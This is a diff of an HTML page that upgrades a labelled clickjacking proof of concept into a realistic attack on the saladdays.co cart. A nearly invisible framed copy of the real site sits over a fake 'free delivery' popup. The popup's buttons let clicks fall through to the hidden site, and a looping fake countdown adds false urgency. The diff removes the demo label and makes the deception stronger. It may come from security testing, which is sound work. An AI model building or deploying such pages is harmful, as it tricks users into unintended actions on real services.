@@ -1,54 +1,168 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Salad Days - Exclusive Offer</title>
+  <title>Salad Days - Exclusive Offer!</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { background: #f5f5f5; font-family: sans-serif; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; overflow: hidden; }
 
-    #decoy-btn {
-      position: fixed;
-      bottom: 195px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 480px;
-      padding: 20px;
-      font-size: 18px;
-      background: #ff6b35;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      z-index: 9999;
-      box-shadow: 0 4px 15px rgba(255,107,53,0.4);
-    }
-
+    /* Real saladdays site - on TOP, nearly invisible, catches all clicks */
     #real-iframe {
       position: fixed;
       top: 0; left: 0;
       width: 100%; height: 100%;
       border: none;
-      opacity: 0.3;
-      z-index: 9998;
+      opacity: 0.08;
+      z-index: 9999;
+      pointer-events: all;
     }
 
-    #label {
+    /* Dark background overlay - passes clicks through to iframe */
+    #overlay {
       position: fixed;
-      top: 10px;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.55);
+      z-index: 100;
+      pointer-events: none;
+    }
+
+    /* Saladdays background visible through overlay */
+    #bg-iframe {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      border: none;
+      opacity: 1;
+      z-index: 1;
+      pointer-events: none;
+      filter: blur(1px);
+    }
+
+    /* Popup modal - pointer-events none so clicks pass through to real iframe */
+    #popup {
+      position: fixed;
+      top: 50%;
       left: 50%;
-      transform: translateX(-50%);
-      background: rgba(0,0,0,0.7);
-      color: white;
-      padding: 6px 14px;
+      transform: translate(-50%, -50%);
+      background: white;
       border-radius: 20px;
+      padding: 36px 32px 28px;
+      width: 400px;
+      text-align: center;
+      box-shadow: 0 24px 80px rgba(0,0,0,0.4);
+      z-index: 500;
+      pointer-events: none;
+    }
+
+    /* X button - ABOVE the iframe, actually interactive */
+    #close-btn {
+      position: absolute;
+      top: 14px; right: 18px;
+      font-size: 22px;
+      cursor: pointer;
+      color: #999;
+      background: none;
+      border: none;
+      line-height: 1;
+      z-index: 99999;
+      pointer-events: all;
+    }
+    #close-btn:hover { color: #333; }
+
+    .offer-badge {
+      display: inline-block;
+      background: #fff5f0;
+      color: #e85d26;
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      padding: 4px 12px;
+      border-radius: 20px;
+      margin-bottom: 16px;
+    }
+
+    .salad-icon { font-size: 52px; margin-bottom: 12px; display: block; }
+
+    #popup h2 {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 10px;
+      line-height: 1.3;
+    }
+
+    #popup p {
+      font-size: 14px;
+      color: #666;
+      line-height: 1.6;
+      margin-bottom: 24px;
+    }
+
+    .timer {
       font-size: 13px;
-      z-index: 10000;
+      color: #e85d26;
+      font-weight: 600;
+      margin-bottom: 20px;
+    }
+
+    /* Claim button - looks interactive but pointer-events: none, clicks fall through to iframe */
+    #claim-btn {
+      width: 100%;
+      padding: 17px;
+      font-size: 16px;
+      font-weight: 600;
+      background: #2fa96a;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      pointer-events: none;
+      box-shadow: 0 4px 16px rgba(47,169,106,0.35);
+    }
+
+    .fine-print {
+      font-size: 11px;
+      color: #bbb;
+      margin-top: 14px;
     }
   </style>
 </head>
 <body>
-  <div id="label">PoC Demo — opacity 0.3 so both layers are visible</div>
-  <button id="decoy-btn">Claim Free Delivery Coupon</button>
+
+  <!-- Layer 1: real saladdays page (blurred background, visible) -->
+  <iframe id="bg-iframe" src="https://www.saladdays.co/cart"></iframe>
+
+  <!-- Layer 2: dark overlay (passes all clicks through) -->
+  <div id="overlay"></div>
+
+  <!-- Layer 3: popup (passes all clicks through except X) -->
+  <div id="popup">
+    <button id="close-btn" onclick="window.location.href='https://www.saladdays.co/cart'">&#x2715;</button>
+    <span class="salad-icon">🥗</span>
+    <div class="offer-badge">Exclusive Offer</div>
+    <h2>You've unlocked free delivery!</h2>
+    <p>As a valued customer, enjoy FREE delivery on your current order. Tap below to apply it instantly.</p>
+    <div class="timer" id="timer">Offer expires in 09:59</div>
+    <button id="claim-btn">Apply Free Delivery</button>
+    <p class="fine-print">By continuing you agree to our Terms &amp; Conditions.</p>
+  </div>
+
+  <!-- Layer 4: real iframe on TOP, nearly invisible, catches all real clicks -->
   <iframe id="real-iframe" src="https://www.saladdays.co/cart"></iframe>
+
+  <script>
+    // Countdown timer for urgency
+    let seconds = 599;
+    setInterval(() => {
+      seconds--;
+      if (seconds <= 0) seconds = 599;
+      const m = String(Math.floor(seconds / 60)).padStart(2, '0');
+      const s = String(seconds % 60).padStart(2, '0');
+      document.getElementById('timer').textContent = `Offer expires in ${m}:${s}`;
+    }, 1000);
+  </script>
+
 </body>
 </html>
